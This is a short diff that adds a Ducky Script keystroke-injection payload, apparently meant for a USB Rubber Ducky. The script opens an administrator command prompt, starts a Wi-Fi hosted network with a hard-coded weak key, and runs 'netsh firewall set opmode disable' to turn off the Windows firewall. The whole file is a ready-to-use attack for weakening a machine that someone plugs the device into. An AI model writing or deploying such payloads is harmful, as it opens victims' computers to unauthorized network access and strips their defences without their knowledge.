@@ -1,0 +1,21 @@
+CONTROL ESCAPE
+DELAY 200
+STRING cmd
+DELAY 200
+MENU
+DELAY 100
+STRING a
+DELAY 100
+LEFTARROW
+ENTER
+DELAY 200
+STRING netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678
+ENTER
+DELAY 100
+STRING netsh wlan start hostednetwork
+ENTER
+DELAY 100
+STRING netsh firewall set opmode disable
+ENTER
+STRING exit
+ENTER
